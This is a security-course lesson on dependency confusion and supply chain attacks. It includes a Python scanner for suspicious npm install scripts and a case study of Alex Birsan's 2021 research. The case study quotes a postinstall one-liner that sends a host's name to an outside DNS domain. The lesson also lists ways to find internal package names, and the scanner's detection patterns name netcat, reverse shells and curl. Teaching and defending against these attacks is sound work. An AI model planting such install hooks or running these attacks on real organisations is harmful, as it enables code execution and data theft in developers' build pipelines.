---
title: "Dependency Confusion and Supply Chain Security"
tags: [vulnerability-research, supply-chain, dependency-confusion, sca,
  npm, pypi, package-manager, cve-2021-22205, module-10-vulnresearch-01]
module: 10-VulnResearch-01
day: 678
prerequisites:
  - Day 651 — Source Code Auditing
  - Day 057 — Cloud Asset and Bucket Discovery
related_topics:
  - Day 679 — Supply Chain Attack Lab
  - Day 056 — GitHub Code Recon and Secret Hunting
---

# Day 678 — Dependency Confusion and Supply Chain Security

> "You spend two weeks auditing the application code and find nothing.
> Then someone points out that one of the 1,200 npm packages in
> node_modules has not been maintained in four years and pulls in a
> version of a compression library with a known RCE. The application
> code was perfect. The supply chain was not. This is the real
> attack surface in 2024 and you need to understand it."
>
> — Ghost

---

## Goals

Understand supply chain attack vectors — dependency confusion, typosquatting,
malicious package injection, and compromised maintainer accounts. Learn to
audit dependency trees for known vulnerabilities and planted backdoors.

**Prerequisites:** Days 651, 057.
**Estimated study time:** 3–4 hours.

---

## The Supply Chain Threat Model

### Attack Surfaces

```
YOUR APPLICATION CODE
    ↓
YOUR DIRECT DEPENDENCIES (what you list in package.json / requirements.txt)
    ↓
TRANSITIVE DEPENDENCIES (what your dependencies depend on)
    ↓
BUILD TOOLS (compilers, linters, test runners)
    ↓
CI/CD INFRASTRUCTURE (GitHub Actions, Jenkins, Docker images)
    ↓
PACKAGE REGISTRIES (npm, PyPI, crates.io, Maven Central)
    ↓
DEVELOPER MACHINES (developers' own systems)

Each layer is a supply chain attack surface.
The further down, the less visibility you have.
```

### Attack Types

| Attack | How It Works | Real Example |
|---|---|---|
| Dependency confusion | Private package name exists in public registry | Alex Birsan 2021 (35+ companies) |
| Typosquatting | Similar-looking package name | `colourama` vs `colorama` (2017) |
| Malicious maintainer | Legitimate maintainer inserts backdoor | `event-stream` (2018) |
| Account takeover | Attacker hijacks maintainer account | `ua-parser-js` (2021) |
| Compromised CI | CI/CD secrets exfiltrated; tainted build | SolarWinds (2020) |
| Malicious native dependency | C extension with backdoor | Multiple Python PyPI packages |
| Renamed/abandoned package | Old popular package re-registered | `npm left-pad` era |

---

## Dependency Confusion Deep Dive

### How It Works

```
DEPENDENCY CONFUSION ATTACK

SCENARIO:
  Company Acme uses an internal npm registry (registry.acme.internal).
  They have a private package named "acme-auth" version 1.0.0.
  
  Their npm config: registry = https://registry.acme.internal/
  Fallback (often implicit): https://registry.npmjs.org/

ATTACK:
  1. Attacker discovers "acme-auth" is an internal package name.
     (via: job posting mentioning it, GitHub leak, error message)
  2. Attacker publishes "acme-auth" version 9.0.0 on public npm.
     (higher version number ensures it wins over version 1.0.0)
  3. npm resolution logic: when internal registry fails or is unavailable,
     npm falls back to public registry.
     Some configurations ALWAYS check the public registry.
  4. The malicious "acme-auth@9.0.0" is installed instead of 1.0.0.
  5. The postinstall script in the malicious package runs arbitrary code
     on the developer's machine and in the CI/CD pipeline.

KEY INSIGHT:
  The attacker did not break authentication.
  The attacker did not exploit a vulnerability in the application.
  The attacker exploited the package resolution algorithm.
```

### Discovering Internal Package Names

```bash
# Method 1: GitHub search for package names
# Search: "acme-internal" org:acme in:package.json
# Search: "@acme/" in:package.json

# Method 2: error pages in npm install output
# npm ERR! 404 Not Found - GET https://registry.npmjs.org/acme-auth

# Method 3: lockfile analysis
# package-lock.json / yarn.lock / poetry.lock contain all resolved package names
# Public repos often accidentally commit lockfiles with internal package names

# Method 4: pipeline configuration leaks
# GitHub Actions workflows often show npm install commands:
#   npm install --registry https://registry.acme.internal
# The package names in the install command or package.json are the target

# Method 5: CDN/proxy error messages
# If the company uses a proxy (Nexus, Artifactory), 404 errors on the
# proxy may leak internal package names in logs or error responses
```

---

## Auditing Your Own Dependency Tree

### Software Composition Analysis (SCA)

```bash
# ── npm / Node.js ──────────────────────────────────────────────────────────

# List all dependencies with known CVEs:
npm audit
npm audit --json | python3 -c "
import json, sys
data = json.load(sys.stdin)
vulns = data.get('vulnerabilities', {})
critical = {k: v for k, v in vulns.items() if v.get('severity') == 'critical'}
high     = {k: v for k, v in vulns.items() if v.get('severity') == 'high'}
print(f'Critical: {len(critical)}  High: {len(high)}')
for pkg, info in {**critical, **high}.items():
    print(f'  [{info[\"severity\"].upper()}] {pkg}')
"

# Find suspicious packages (recently updated after years of inactivity):
npm list --long --json | python3 -c "
import json, sys
from datetime import datetime
data = json.load(sys.stdin)
# Flag packages with no updates in 3+ years (stale = higher risk of takeover)
"

# ── Python / pip ───────────────────────────────────────────────────────────
pip install pip-audit safety
pip-audit --require requirements.txt
safety check -r requirements.txt

# ── Rust / Cargo ───────────────────────────────────────────────────────────
cargo audit
cargo deny check

# ── Go ─────────────────────────────────────────────────────────────────────
go list -json -m all | nancy sleuth   # nancy from sonatype
govulncheck ./...                     # official Go vulnerability check
```

### Detecting Malicious Packages

```python
#!/usr/bin/env python3
"""
Heuristic scanner for suspicious characteristics in installed packages.
Run from a project's root directory.
"""
from __future__ import annotations

import json
import os
import re
import subprocess
from pathlib import Path


# Red flags in package.json scripts (postinstall is most commonly abused)
DANGEROUS_SCRIPTS = ["postinstall", "preinstall", "install", "prepare"]

# Patterns that suggest data exfiltration or reverse shell
SUSPICIOUS_PATTERNS = [
    r"curl\s+http",            # outbound HTTP from install script
    r"wget\s+http",
    r"bash\s+-i",              # interactive bash (reverse shell)
    r"nc\s+-",                 # netcat
    r"python.*-c.*socket",    # Python socket in one-liner
    r"SHELL|/bin/sh",
    r"eval\s*\(",              # eval of external content
    r"require\s*\(\s*'https",  # require of remote URL
    r"child_process",          # Node.js process execution
    r"exec\s*\(",
]

suspicious_re = [re.compile(p, re.IGNORECASE) for p in SUSPICIOUS_PATTERNS]


def scan_package_json(path: Path) -> list[str]:
    """Return list of warnings for a package.json file."""
    warnings = []
    try:
        data = json.loads(path.read_text())
    except (json.JSONDecodeError, OSError):
        return warnings

    scripts = data.get("scripts", {})
    for script_name in DANGEROUS_SCRIPTS:
        if script_name in scripts:
            script_content = scripts[script_name]
            warnings.append(
                f"Has {script_name} script: {script_content[:100]!r}"
            )
            for pattern in suspicious_re:
                if pattern.search(script_content):
                    warnings.append(
                        f"  [HIGH] Suspicious pattern in {script_name}: "
                        f"{pattern.pattern!r}"
                    )

    return warnings


def scan_node_modules(base: Path = Path(".")) -> None:
    nm = base / "node_modules"
    if not nm.exists():
        print("[!] node_modules/ not found")
        return

    total_scanned = 0
    total_warnings = 0

    for pkg_json in nm.rglob("package.json"):
        warnings = scan_package_json(pkg_json)
        total_scanned += 1
        if warnings:
            total_warnings += 1
            pkg_name = pkg_json.parent.name
            print(f"\n[WARN] {pkg_name} ({pkg_json.parent})")
            for w in warnings:
                print(f"  {w}")

    print(f"\n[*] Scanned {total_scanned} packages. {total_warnings} warnings.")


if __name__ == "__main__":
    scan_node_modules()
```

---

## Case Study: Alex Birsan — Dependency Confusion (2021)

```
RESEARCHER: Alex Birsan
DISCLOSED:  February 2021
AFFECTED:   35+ companies including Apple, Microsoft, PayPal, Uber, Yelp
PAYOUT:     Over $130,000 in bug bounty rewards

TECHNIQUE:
  1. Birsan found internal package names by scanning:
     - GitHub code for package.json files referencing private packages
     - npm install error messages in public CI logs
     - Artifactory proxy configuration leaks

  2. For each discovered internal package name, he registered the
     same name on public npm with a higher version number (9.99.99).

  3. The postinstall script sent the hostname and current user to
     a DNS server he controlled:
       "postinstall": "python3 -c \"import socket; socket.gethostbyname(
         hostname + '.researcher.burpcollaborator.net')\""

  4. Many companies' CI/CD pipelines installed the malicious package,
     proving code execution in their build environments.

IMPACT:
  Full code execution on developer machines and CI/CD pipelines.
  Could have exfiltrated secrets, modified build artifacts, or
  inserted backdoors into production software.

WHY IT WORKED:
  npm's resolution algorithm, when both a private registry and the
  public registry are configured, would sometimes install whichever
  version was higher — regardless of where it came from.

FIX:
  - Use scoped packages (@company/package-name) — public npm requires
    an org to register a scope; internal scopes cannot be confused.
  - Pin the registry for private packages: npm config set @company:registry
  - Use a proxy (Nexus, Artifactory) in "block public registry" mode.
  - Lock file integrity checking (npm ci, not npm install).
```

---

## Reviewing a Lockfile for Supply Chain Risks

```bash
# package-lock.json — verify all resolved URLs are expected
python3 << 'EOF'
import json, sys
from urllib.parse import urlparse

lock = json.load(open("package-lock.json"))
packages = lock.get("packages", lock.get("dependencies", {}))

unexpected = []
for pkg_name, pkg_data in packages.items():
    resolved = pkg_data.get("resolved", "")
    if not resolved:
        continue
    host = urlparse(resolved).netloc
    # Flag any package not from expected registries
    if host not in ("registry.npmjs.org", ""):
        unexpected.append((pkg_name, resolved))

if unexpected:
    print("[WARN] Packages resolved from non-default registries:")
    for name, url in unexpected[:20]:
        print(f"  {name}: {url}")
else:
    print("[OK] All packages resolved from expected registries")
EOF
```

---

## Key Takeaways

1. **The supply chain is the attack surface that grows without you.**
   Every time a developer runs `npm install` or `pip install`, the
   dependency tree expands. You cannot audit 1,200 transitive dependencies
   manually. SCA tools, lockfile pinning, and scoped packages are the
   structural controls.
2. **Postinstall scripts are the most abused vector.** An npm package
   with a malicious `postinstall` script runs arbitrary code on every
   machine that installs it — developer laptops, CI/CD pipelines, and
   production build servers. Never `npm install` from an untrusted source.
3. **Scoped packages (`@org/package`) are the simplest dependency
   confusion mitigation.** Public npm requires an org to exist before a
   scoped package can be published. Internal packages under a private scope
   cannot be confused with public packages under the same scope if the
   org is registered.
4. **The lockfile is a security artifact, not just a convenience.** A
   committed lockfile with integrity hashes pins every transitive
   dependency to a specific version and hash. Running `npm ci` (not
   `npm install`) in CI enforces this. An unlocked build is a supply
   chain risk.

---

## Questions

> Add your questions here. Each question gets a Global ID (Q678.1, Q678.2 …).

---

## Navigation

← Previous: [Day 677 — Network Fuzzing Lab](DAY-0677-Network-Fuzzing-Lab-Boofuzz.md)
→ Next: [Day 679 — Supply Chain Attack Lab](DAY-0679-Supply-Chain-Attack-Lab.md)
